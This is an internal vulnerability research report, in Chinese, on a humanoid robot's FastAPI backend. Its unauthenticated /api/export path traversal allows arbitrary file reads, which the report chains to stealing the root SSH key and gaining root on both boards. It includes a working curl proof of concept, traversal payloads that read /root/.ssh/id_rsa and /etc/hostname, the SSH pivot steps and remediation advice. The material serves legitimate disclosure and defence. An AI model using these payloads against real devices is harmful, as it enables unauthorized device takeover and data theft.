---
编号: UBH-006
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选人型
源候选目录: api-export路径穿越任意文件读到双板root-1
---
# UBH-006 t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root

## 1. 一句话结论

- # t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
- ## 1. 执行摘要
- `../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
- 严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
- 未认证 POST :5000/api/export {"map_names":["../../../root/.ssh/id_rsa"]}

## 2. 影响产品与版本

- > 版本：2026-08-29 · 方法：实机验证（授权自有设备）+ 源码审计
- `../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
- → 双板 root → docker save 拉取全部固件镜像（27 个，39GB）
- - 组件：`t800-web-backend` v0.2.9（:5000 FastAPI，Alpine 3.20.2 容器，容器内 root）

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- # t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
- `../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
- 严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
- ## 2. 漏洞根因
- 实机根因旁证（2026-08-29）：错误响应 `{"detail":"Export failed: File not found: /etc/walker/map/../../etc/hostname"}`
- 未认证 POST :5000/api/export {"map_names":["../../../root/.ssh/id_rsa"]}

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
- > 作为最小影响证明，未重复读取私钥，未做任何写操作。
- 读取 `/root/.ssh/id_rsa`（RSA-3072 "x86_root"）后即可 `ssh <访问令牌_01>.168.11.{2,3}` 且
- sudo 免密 + docker 组，一次性获得 vision + motion 双板 root。这是整个研究链的初始立足点。**
- 严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
- src = os.path.join(MAP_ROOT, name)      # ← name 含 "../" 时穿越，未做 realpath/前缀校验

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root

> 版本：2026-08-29 · 方法：实机验证（授权自有设备）+ 源码审计
> **边界声明**：在研究者自有 Walker S2（SN `<其他机器人设备_01>`）上验证；只读 `/etc/hostname`
> 作为最小影响证明，未重复读取私钥，未做任何写操作。

---

## 1. 执行摘要

**FastAPI :5000 `/api/export`（POST）在拼接导出目录时未清理用户可控的 `map_names`，通过
`../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
读取 `/root/.ssh/id_rsa`（RSA-3072 "x86_root"）后即可 `ssh <访问令牌_01>.168.11.{2,3}` 且
sudo 免密 + docker 组，一次性获得 vision + motion 双板 root。这是整个研究链的初始立足点。**

严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。

---

## 2. 漏洞根因

代码：`t800-web-backend`（git 历史 v0.1.x–v0.2.9）`controller/upload.py` 的 export 处理。

```python
# 伪代码还原
@app.post("/api/export")
def export(map_names: list[str] = ...):
    for name in map_names:
        src = os.path.join(MAP_ROOT, name)      # ← name 含 "../" 时穿越，未做 realpath/前缀校验
        # src → 打包 → /tmp/exports/tmp*/exported_maps.tar.gz → 响应返回
```

`os.path.join("/etc/walker/map", "../../../etc/hostname")` → `/etc/walker/map/../../../etc/hostname`
→ 规范化为 `/etc/hostname`。无 realpath 归一化校验，`..` 未拒绝。

实机根因旁证（2026-08-29）：错误响应 `{"detail":"Export failed: File not found: /etc/walker/map/../../etc/hostname"}`
——基准目录与拼接均未校验，仅因深度不足报 File not found。

---

## 3. 攻击链

```
未认证 POST :5000/api/export {"map_names":["../../../root/.ssh/id_rsa"]}
  → 返回 gzip tar 内含 /root/.ssh/id_rsa（RSA-3072 "x86_root"，vision/motion 双板同钥，
    指纹 SHA256:Pst3yKE0Ai7JGXBxoCsrMM5Leypxgk+hn7/h3t/mdxc）
  → ssh -i id_rsa <访问令牌_01>.168.11.3 / 192.168.11.2   （免密 sudo + docker 组）
  → 双板 root → docker save 拉取全部固件镜像（27 个，39GB）
```

> 报告 PoC 记 `../../root/.ssh/id_rsa`；当前 v0.2.9 基准为 `/etc/walker/map/`，两层 `..` 只到
> `/etc`，需 **`../../../`**。穿越本身存在且层数随基准目录变化。

---

## 4. 受影响范围

- 组件：`t800-web-backend` v0.2.9（:5000 FastAPI，Alpine 3.20.2 容器，容器内 root）
- 入口：`POST /api/export`，**未认证**
- 前置：无；附带条件——容器将 `/root`（`~/.ssh`）、`/etc/walker`、`/tmp` bind-mount 到宿主，故读取面=宿主全盘

---

## 5. 复现（实机，2026-08-29）

```bash
# 最小影响证明：读取 /etc/hostname
curl -s -X POST http://192.168.11.3:5000/api/export \
  -H 'Content-Type: application/json' \
  -d '{"map_names":["../../../etc/hostname"]}'
# 响应：gzip tar，成员 "hostname"，内容 "3473023565a5"   ✅ 实机复现

# 完整利用（报告已确认）：读 SSH 私钥
# -d '{"map_names":["../../../root/.ssh/id_rsa"]}'
```

**注意副作用**：每次成功导出在 `/tmp/exports/tmp*/` 永久留档 → 未认证磁盘填满 DoS（见
`FastAPI-5000无认证信息泄露与docs暴露` 目录）。本次最小验证留档 ~KB 级，可清理：
`find /tmp/exports -name exported_maps.tar.gz -delete`。

---

## 6. 修复建议

1. `map_names` 逐项 `os.path.realpath` 后校验必须落在 `MAP_ROOT` 前缀内；
2. `/api/export` 增加认证（修复 auth 缺失根因，见源码审计 lead）；
3. 容器移除 `~/.ssh`、`/etc/walker` 到宿主的 bind-mount；
4. 导出完成后清理 `/tmp/exports`，或改为流式返回不落盘。

---

## 7. 证据文件

| 文件 | 内容 |
|---|---|
| `evidence/export_hostname_proof.md` | 实机复现命令 + 原始响应解析（gzip tar → hostname 内容） |
| 报告 `WALKER_S2_PWN.md` | exp_* 系列证据（passwd/shadow/hostname/os-release/id_rsa 响应）、SSH key 指纹、攻破链路 |
